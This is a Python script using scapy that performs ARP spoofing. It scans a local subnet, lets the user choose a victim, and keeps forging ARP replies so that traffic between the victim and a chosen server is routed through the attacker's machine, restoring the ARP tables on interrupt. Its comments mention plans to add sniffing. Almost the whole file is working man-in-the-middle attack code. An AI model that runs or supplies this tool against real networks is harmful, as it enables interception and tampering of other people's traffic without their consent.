import scapy.all as scapy
import time

#Define victim IP and Server IP -> automatize, let user select victim also implement sniffing instead of spamming
VICTIM_IP = "192.168.50.20"
SERVER_IP = "192.168.50.30"
INTERFACE = "eth1"
NETWORK_RANGE = "192.168.50.0/24"

#Get mac adress of the victim

def get_mac(ip):
    arp_request =scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]


    return answered_list[0][1].hwsrc

def spoof(VICTIM_IP, spoof_ip):
    mac_target = get_mac(VICTIM_IP)
    packet = scapy.ARP(op=2, pdst=VICTIM_IP, hwdst=mac_target, psrc=spoof_ip)
    ether_frame = scapy.Ether(dst=mac_target)
    scapy.sendp(ether_frame / packet, verbose=False, iface=INTERFACE)

def restore(destination_ip, source_ip):
    destination_ip_mac = get_mac(destination_ip)
    source_ip_mac = get_mac(source_ip)
    ether_frame = scapy.Ether(dst=destination_ip_mac)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip_mac, psrc=source_ip, hwsrc=source_ip_mac)
    scapy.sendp(ether_frame / packet, count=5, verbose=False, iface=INTERFACE)

def run_spoofing(victim=VICTIM_IP, server=SERVER_IP):
    sent_packets_count = 0
    try:
        while True:
            spoof(victim, server)
            spoof(server, victim)
            
            sent_packets_count = sent_packets_count + 2
            print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
            
            time.sleep(2)

    except KeyboardInterrupt:
        # Restore only while testing
        restore(victim, server)
        restore(server, victim)

def main():
    request = scapy.ARP(pdst=NETWORK_RANGE)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether / request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]

    hosts = []

    for sent, received in answered_list:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("Available devices in the network:")
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    for host in hosts:
        print(f"{host['ip']}\t\t{host['mac']}")
    request_input = input("Select the target IP address: ")
    if request_input in [host['ip'] for host in hosts]:    
        run_spoofing(request_input)

if __name__ == "__main__":
    main()